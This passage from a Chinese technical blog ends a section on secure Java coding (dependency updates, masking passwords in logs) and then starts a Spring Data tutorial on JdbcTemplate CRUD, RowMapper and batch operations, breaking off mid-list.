<li><strong>保持依赖项更新</strong>: 定期（例如，在每个 sprint 开始时）检查并更新你的项目依赖到一个新的稳定版本。这不仅能修复已知的安全漏洞，还能获得性能改进和新功能。</li>
<li><strong>订阅安全通告</strong>: 关注你所使用的核心框架（如 Spring, Log4j）的安全邮件列表或公告，以便在出现严重漏洞（如 Log4Shell）时能第一时间响应。</li>
</ul>
<hr>
<h4 id="7-2-5-避免在日志中记录敏感信息"><a href="#7-2-5-避免在日志中记录敏感信息" class="headerlink" title="7.2.5 避免在日志中记录敏感信息"></a>7.2.5 避免在日志中记录敏感信息</h4><p><strong>为什么？</strong></p>
<p>日志是排查问题的重要工具，但也可能成为敏感信息泄露的源头。如果在日志中不慎打印了用户密码、Session ID、API Key、信用卡号、个人身份信息等，这些信息可能会被存储在日志文件、日志管理系统（如 ELK Stack）中，从而扩大了攻击面。任何能够访问日志系统的人都可能获取到这些敏感数据。</p>
<p><strong>如何做？</strong></p>
<ul>
<li><p><strong>重写 <code>toString()</code> 方法</strong>: 对于包含敏感数据的 DTO 或实体类（如 <code>User</code>），务必重写其 <code>toString()</code> 方法，对敏感字段进行屏蔽。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserRegistrationDto</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserRegistrationDto&#123;&quot;</span> +</span><br><span class="line">               <span class="string">&quot;username=&#x27;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">               <span class="string">&quot;, password=&#x27;[PROTECTED]&#x27;&quot;</span> +</span><br><span class="line">               <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 Lombok 的 <code>@ToString(exclude = {&quot;password&quot;})</code> 是一个更简洁的方式。</p>
</li>
<li><p><strong>审查日志输出</strong>: 在代码审查（Code Review）时，特别注意 <code>logger.info()</code>, <code>System.out.println()</code> 等输出语句，确保它们没有直接打印包含敏感信息的完整对象或请求体。</p>
</li>
<li><p><strong>配置日志框架</strong>: 一些日志框架允许配置过滤器，自动屏蔽匹配特定模式（如信用卡号格式）的字符串。</p>
</li>
<li><p><strong>Spring Boot Actuator</strong>: 如果你使用了 Actuator 的 <code>/trace</code> 或 <code>/httptrace</code> 端点，要注意它默认可能会记录请求头和响应头。检查其配置，确保像 <code>Authorization</code> 或 <code>Cookie</code> 这样的敏感头信息被屏蔽了。</p>
</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/05/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%BA%93/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6-SpringData/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冉丝堂">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="冉的技术宝典">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | 冉的技术宝典">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/05/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%BA%93/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6-SpringData/" class="post-title-link" itemprop="url">Spring全家桶-SpringData</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-05 19:55:10" itemprop="dateCreated datePublished" datetime="2025-10-05T19:55:10+08:00">2025-10-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-17 11:09:43" itemprop="dateModified" datetime="2025-10-17T11:09:43+08:00">2025-10-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E4%B8%8E%E7%94%9F%E6%80%81/" itemprop="url" rel="index"><span itemprop="name">开发框架与生态</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E4%B8%8E%E7%94%9F%E6%80%81/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/" itemprop="url" rel="index"><span itemprop="name">Spring全家桶</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="四、SpringData"><a href="#四、SpringData" class="headerlink" title="四、SpringData"></a>四、SpringData</h1><h2 id="1-Spring-JDBC"><a href="#1-Spring-JDBC" class="headerlink" title="1. Spring JDBC"></a>1. Spring JDBC</h2><h3 id="1-1-JdbcTemplate-的使用-CRUD操作"><a href="#1-1-JdbcTemplate-的使用-CRUD操作" class="headerlink" title="1.1 JdbcTemplate 的使用 (CRUD操作)"></a>1.1 <code>JdbcTemplate</code> 的使用 (CRUD操作)</h3><h4 id="1-1-1-什么是-JdbcTemplate？"><a href="#1-1-1-什么是-JdbcTemplate？" class="headerlink" title="1.1.1 什么是 JdbcTemplate？"></a>1.1.1 什么是 <code>JdbcTemplate</code>？</h4><p><code>JdbcTemplate</code> 是 Spring Framework 核心包 (<code>spring-jdbc</code>)中提供的一个核心类。它<strong>极大地简化了传统JDBC的使用</strong>，旨在解决原生JDBC开发的几大痛”点：</p>
<ol>
<li><strong>资源管理的繁琐</strong>: 原生JDBC需要手动管理<code>Connection</code>, <code>Statement</code>, <code>ResultSet</code>的创建和关闭，并且必须在<code>finally</code>块中进行以确保资源释放，代码冗长且容易出错。</li>
<li><strong>异常处理的复杂</strong>: 原生JDBC抛出的是受检异常 <code>SQLException</code>，开发者必须在代码中显式地<code>try-catch</code>。</li>
<li><strong>重复的样板代码</strong>: 每次查询都需要重复编写获取连接、创建<code>Statement</code>、执行SQL、遍历<code>ResultSet</code>、关闭资源等一系列步骤。</li>
</ol>
<p><strong><code>JdbcTemplate</code> 所做的就是将这些重复的、底层的、资源管理相关的“脏活累活”全部封装起来</strong>，让开发者可以只专注于两件核心的事情：</p>
<ol>
<li><strong>提供SQL语句</strong>。</li>
<li><strong>处理查询结果</strong>。</li>
</ol>
<hr>
<h4 id="1-1-2-配置与准备"><a href="#1-1-2-配置与准备" class="headerlink" title="1.1.2 配置与准备"></a>1.1.2 配置与准备</h4><p><strong>Step 1: 添加依赖</strong></p>
<p>只需要引入<code>spring-boot-starter-jdbc</code>依赖。通常，如果你使用了任何数据库相关的Starter（如<code>spring-boot-starter-data-jpa</code>或<code>spring-boot-starter-mybatis</code>），这个依赖已经被传递性地包含了。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span> <span class="comment">&lt;!-- 或者其他数据库驱动 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>Step 2: 配置数据源 (<code>application.yml</code>)</strong></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/testdb?useSSL=false&amp;serverTimezone=UTC</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">password</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br></pre></td></tr></table></figure>

<p><strong>Step 3: 注入 <code>JdbcTemplate</code></strong></p>
<p>Spring Boot的自动配置机制会检测到<code>DataSource</code>的存在，并<strong>自动为你创建一个 <code>JdbcTemplate</code> 的Bean</strong>。你只需要在需要使用它的地方（如Service或DAO层）通过 <code>@Autowired</code> 注入即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.JdbcTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Repository;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JdbcTemplate jdbcTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... CRUD方法将在这里实现</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="1-1-3-核心CRUD操作"><a href="#1-1-3-核心CRUD操作" class="headerlink" title="1.1.3 核心CRUD操作"></a>1.1.3 核心CRUD操作</h4><p>假设我们有一个<code>user</code>表，包含<code>id</code>, <code>username</code>, <code>password</code>, <code>email</code>字段。</p>
<h5 id="1-更新操作-INSERT-UPDATE-DELETE"><a href="#1-更新操作-INSERT-UPDATE-DELETE" class="headerlink" title="1. 更新操作 (INSERT, UPDATE, DELETE)"></a>1. 更新操作 (INSERT, UPDATE, DELETE)</h5><p>对于所有不返回结果集（只返回受影响行数）的写操作，都使用 <code>update()</code> 方法。</p>
<ul>
<li><strong><code>int update(String sql, Object... args)</code></strong>:<ul>
<li><code>sql</code>: 带有 <code>?</code> 占位符的SQL语句。</li>
<li><code>args</code>: 与 <code>?</code> 占位符按顺序对应的参数列表。</li>
<li><strong>返回值</strong>: <code>int</code> 类型，表示受影响的行数。</li>
</ul>
</li>
</ul>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CREATE (INSERT)</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">addUser</span><span class="params">(User user)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;INSERT INTO user (username, password, email) VALUES (?, ?, ?)&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.update(sql, user.getUsername(), user.getPassword(), user.getEmail());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UPDATE</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">updateUserEmail</span><span class="params">(Long id, String newEmail)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;UPDATE user SET email = ? WHERE id = ?&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.update(sql, newEmail, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DELETE</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">deleteUser</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;DELETE FROM user WHERE id = ?&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.update(sql, id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>优势</strong>: <code>JdbcTemplate</code> 内部处理了 <code>PreparedStatement</code> 的创建和参数绑定，有效防止了<strong>SQL注入</strong>。</p>
<hr>
<h5 id="2-查询单个值-Query-for-a-Single-Value"><a href="#2-查询单个值-Query-for-a-Single-Value" class="headerlink" title="2. 查询单个值 (Query for a Single Value)"></a>2. 查询单个值 (Query for a Single Value)</h5><p>当你确定查询结果<strong>只有一行一列</strong>时（例如查询总数、获取某个用户的姓名），使用 <code>queryForObject()</code>。</p>
<ul>
<li><strong><code>T queryForObject(String sql, Class&lt;T&gt; requiredType, Object... args)</code></strong>:<ul>
<li><code>requiredType</code>: 期望返回值的类型（如 <code>Integer.class</code>, <code>String.class</code>）。</li>
<li><strong>注意</strong>: 如果查询没有返回任何行，或者返回了多行，此方法会抛出异常。</li>
</ul>
</li>
</ul>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询用户总数</span></span><br><span class="line"><span class="keyword">public</span> Integer <span class="title function_">countUsers</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT COUNT(*) FROM user&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.queryForObject(sql, Integer.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据ID查询用户名</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getUsernameById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT username FROM user WHERE id = ?&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.queryForObject(sql, String.class, id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="3-查询单个对象-Query-for-a-Single-Object"><a href="#3-查询单个对象-Query-for-a-Single-Object" class="headerlink" title="3. 查询单个对象 (Query for a Single Object)"></a>3. 查询单个对象 (Query for a Single Object)</h5><p>当你需要将<strong>一行</strong>查询结果映射为一个完整的Java对象时，也使用 <code>queryForObject()</code>，但需要提供一个 <code>RowMapper</code>。</p>
<ul>
<li><strong><code>T queryForObject(String sql, RowMapper&lt;T&gt; rowMapper, Object... args)</code></strong>:<ul>
<li><code>RowMapper&lt;T&gt;</code>: 这是一个<strong>函数式接口</strong>，其核心方法是 <code>T mapRow(ResultSet rs, int rowNum)</code>。你需要在这个方法中实现如何将 <code>ResultSet</code> 的当前行数据，手动映射到你的Java对象的字段上。</li>
</ul>
</li>
</ul>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.RowMapper;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据ID查询一个完整的User对象</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">findUserById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM user WHERE id = ?&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// RowMapper可以定义为匿名内部类，或Lambda表达式，或一个独立的类</span></span><br><span class="line">    RowMapper&lt;User&gt; rowMapper = (rs, rowNum) -&gt; &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setId(rs.getLong(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">        user.setUsername(rs.getString(<span class="string">&quot;username&quot;</span>));</span><br><span class="line">        user.setPassword(rs.getString(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">        user.setEmail(rs.getString(<span class="string">&quot;email&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> jdbcTemplate.queryForObject(sql, rowMapper, id);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (EmptyResultDataAccessException e) &#123;</span><br><span class="line">        <span class="comment">// queryForObject在找不到记录时会抛出此异常，可以捕获并返回null</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Spring内置的 <code>BeanPropertyRowMapper</code></strong>:</p>
<p>如果你的Java Bean的<strong>字段名</strong>与数据库表的<strong>列名</strong>完全一致（或符合驼峰与下划线的转换规则），你可以使用 <code>BeanPropertyRowMapper</code> 来简化映射，无需手动编写<code>RowMapper</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.BeanPropertyRowMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">findUserByIdSimple</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM user WHERE id = ?&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.queryForObject(sql, <span class="keyword">new</span> <span class="title class_">BeanPropertyRowMapper</span>&lt;&gt;(User.class), id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="4-查询对象列表-Query-for-a-List-of-Objects"><a href="#4-查询对象列表-Query-for-a-List-of-Objects" class="headerlink" title="4. 查询对象列表 (Query for a List of Objects)"></a>4. 查询对象列表 (Query for a List of Objects)</h5><p>当你需要查询<strong>多行</strong>数据，并将每一行都映射为一个Java对象时，使用 <code>query()</code> 方法。</p>
<ul>
<li><strong><code>List&lt;T&gt; query(String sql, RowMapper&lt;T&gt; rowMapper, Object... args)</code></strong>:<ul>
<li>这个方法会遍历 <code>ResultSet</code> 的所有行，对每一行都调用你提供的 <code>RowMapper</code>，并将所有映射出的对象收集到一个 <code>List</code> 中返回。</li>
<li>如果查询结果为空，它会返回一个<strong>空的List</strong>，而不是<code>null</code>。</li>
</ul>
</li>
</ul>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询所有用户</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAllUsers</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM user&quot;</span>;</span><br><span class="line">    <span class="comment">// 可以复用上面定义的rowMapper，或者使用BeanPropertyRowMapper</span></span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.query(sql, <span class="keyword">new</span> <span class="title class_">BeanPropertyRowMapper</span>&lt;&gt;(User.class));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据email后缀查询用户</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findUsersByEmailDomain</span><span class="params">(String domain)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM user WHERE email LIKE ?&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.query(sql, <span class="keyword">new</span> <span class="title class_">BeanPropertyRowMapper</span>&lt;&gt;(User.class), <span class="string">&quot;%&quot;</span> + domain);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="5-批量操作-Batch-Operations"><a href="#5-批量操作-Batch-Operations" class="headerlink" title="5. 批量操作 (Batch Operations)"></a>5. 批量操作 (Batch Operations)</h5><p>当需要执行大量相同的写操作时（如一次性插入1000条记录），使用 <code>batchUpdate()</code> 可以获得极高的性能，因为它会减少网络往返次数。</p>
<ul>
<li><strong><code>int[] batchUpdate(String sql, List&lt;Object[]&gt; batchArgs)</code></strong>:</li>
</ul>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 批量添加用户</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span>[] batchAddUsers(List&lt;User&gt; users) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;INSERT INTO user (username, password, email) VALUES (?, ?, ?)&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    List&lt;Object[]&gt; batchArgs = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (User user : users) &#123;</span><br><span class="line">        Object[] args = &#123;user.getUsername(), user.getPassword(), user.getEmail()&#125;;</span><br><span class="line">        batchArgs.add(args);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.batchUpdate(sql, batchArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="2-Spring-Data-Commons"><a href="#2-Spring-Data-Commons" class="headerlink" title="2. Spring Data Commons"></a>2. Spring Data Commons</h2><h3 id="2-1-核心理念"><a href="#2-1-核心理念" class="headerlink" title="2.1 核心理念"></a>2.1 核心理念</h3><h4 id="2-1-1-问题背景：传统数据访问层的痛点"><a href="#2-1-1-问题背景：传统数据访问层的痛点" class="headerlink" title="2.1.1 问题背景：传统数据访问层的痛点"></a>2.1.1 问题背景：传统数据访问层的痛点</h4><p>在 Spring Data 出现之前，即使使用了像 JPA&#x2F;Hibernate 这样的ORM框架，数据访问层（DAO&#x2F;Repository层）的开发依然存在大量重复的、机械化的<strong>样板代码 (Boilerplate Code)</strong>。</p>
<p>对于每一个实体（Entity），比如 <code>User</code>, <code>Order</code>, <code>Product</code>，我们通常都需要手动编写一个实现类，并在其中一遍又一遍地实现最基础的CRUD（创建、读取、更新、删除）操作：</p>
<p><strong>传统的JPA Repository实现示例：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Repository</span> <span class="comment">// 声明为数据访问Bean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JpaUserRepository</span> <span class="keyword">implements</span> <span class="title class_">UserRepository</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PersistenceContext</span> <span class="comment">// 注入JPA的EntityManager</span></span><br><span class="line">    <span class="keyword">private</span> EntityManager em;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">findById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> em.find(User.class, id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> em.createQuery(<span class="string">&quot;SELECT u FROM User u&quot;</span>, User.class).getResultList();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">save</span><span class="params">(User user)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (user.getId() == <span class="literal">null</span>) &#123;</span><br><span class="line">            em.persist(user); <span class="comment">// 新增</span></span><br><span class="line">            <span class="keyword">return</span> user;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> em.merge(user); <span class="comment">// 更新</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(User user)</span> &#123;</span><br><span class="line">        em.remove(em.contains(user) ? user : em.merge(user));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果需要按名字查找，还需要再写一个方法...</span></span><br><span class="line">    <span class="comment">// public User findByUsername(String username) &#123; ... &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>痛点分析</strong>：</p>
<ol>
